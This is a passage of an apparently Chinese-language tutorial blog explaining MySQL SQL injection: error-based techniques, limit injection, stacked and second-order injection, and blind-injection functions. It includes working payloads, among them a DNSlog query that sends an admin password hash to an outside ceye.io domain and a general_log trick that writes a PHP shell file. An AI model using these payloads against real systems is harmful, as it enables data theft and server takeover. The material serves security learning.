class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 <code>count(*)</code></p><p><strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组</strong></p><p>同理我们根据<code>floor(rand(0)*2)</code>进行分组—–这里要注意<code>floor(rand(0)*2)</code>执行之后是有规律的返回0或者1。</p><p>根据之前rand的顺序—011011011,我们来梳理一下为什么会报错</p><ul><li><p>第一次计算执行一次产生0,表中不存在任何数据,然后开始插入</p></li><li><p>插入的时候会进行第二次计算,所以在执行一次产生1插入</p></li><li><p>第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算</p></li><li><p>第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,<strong>注意是产生一个分组,不是单纯的产生一个数值</strong></p><p>此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。</p></li></ul><p>注意：</p><p>sql语句在执行之后建立虚表分两种情况：</p><p>1、表中没有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>会被执行两次。</p><p>2、表中有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>只会被执行一次。</p><p>主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据</p></li></ul></li><li><p>几何函数</p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数</p><p>这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。</p></li><li><p>DNSlog外带配合报错注入</p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\&#39;,(SELECT hex(pass) </span><br><span class="line">FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\abc&#39;))</span><br></pre></td></tr></table></figure><p>load_file函数在Linux下是无法用来做dnslog攻击的。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\sss.xxx\test\</p><p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用UNC路径。</p><p>tips：</p><p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure></li></ul><h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul><li><p>常用函数</p><ul><li>limit [位置偏移量,]行数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math limit 1,2;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math limit 1,3;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>benchmark</p><p>benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 .</p></li></ul></li><li><p>limit注入</p><ul><li><p>注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math limit 1,[可控点] </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math order by id desc limit 1,2</span><br></pre></td></tr></table></figure><p>limit后面能够拼接的函数只有into和procedure。</p></li><li><p>无order by关键字</p><ul><li><p>使用union联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from math order by id desc limit 0,1 union select username from users;</span><br></pre></td></tr></table></figure></li><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li><li><p>有order by关键字</p><p>无法使用union关键字，可尝试盲注或者报错</p><ul><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li></ul></li></ul><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>定义</p><p>堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  * from  math;select user();</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>原理：</p><ul><li><p>mysql_query与mysqli-&gt;multi_query()</p><p>mysql_query() 函数执行一条 MySQL 查询。</p><p>mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。</p></li><li><p>利用配合日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure></li></ul><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><ul><li><p>原理：</p><p>用户第一次输入的数据，经过各种函数处理比如<code>addslashes</code>或者<code>get_magic_quotes_gpc</code>之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。</p></li><li><p>实例：</p><p>sqlib-24</p><p>我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。</p><p>程序从数据库中取出脏数据后，执行的sql语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><p>原理：</p><p>指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。</p><p>盲注分为两类：<br> 　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br> 　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p></li><li><p>常用函数</p><h5 id="IF"><a href="#IF" class="headerlink" title="IF()"></a>IF()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><h5 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h5><p>MID() 函数用于从文本字段中提取字符。</p><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| No                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Now                  |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,0,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><strong>substr()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| N                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,2,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| o                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,3,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| w                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| No                      |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>case()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| two                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| one                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| more                                                       |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII">ASCII</a> 值。</p><h5 id="ELT-N-str1-str2-str3-…"><a href="#ELT-N-str1-str2-str3-…" class="headerlink" title="ELT(N,str1,str2,str3,…)"></a>ELT(N,str1,str2,str3,…)</h5><p>如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;)                      |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ej                                                      |</span><br><span 